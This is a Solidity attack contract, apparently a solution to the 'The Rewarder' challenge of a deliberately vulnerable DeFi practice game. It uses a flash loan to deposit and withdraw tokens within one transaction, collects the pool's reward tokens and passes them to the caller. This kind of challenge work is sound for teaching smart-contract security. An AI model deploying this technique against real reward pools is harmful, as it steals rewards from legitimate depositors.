// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "../the-rewarder/RewardToken.sol";

contract AttackTheRewarder {

    FlashLoanerPool private flashLoanPool;
    TheRewarderPool private rewarderPool;

    DamnValuableToken private liquidityToken;
    
    constructor(address flashLoanPoolAddress,
                address rewarderPoolAddress,
                address liquidityTokenAddress) {
        flashLoanPool = FlashLoanerPool(flashLoanPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }
    
    function attack(uint256 tokensToRequest) external {
        flashLoanPool.flashLoan(tokensToRequest);
        RewardToken rewardToken = rewarderPool.rewardToken();
        rewardToken.transfer(msg.sender,
                             rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
    }
}
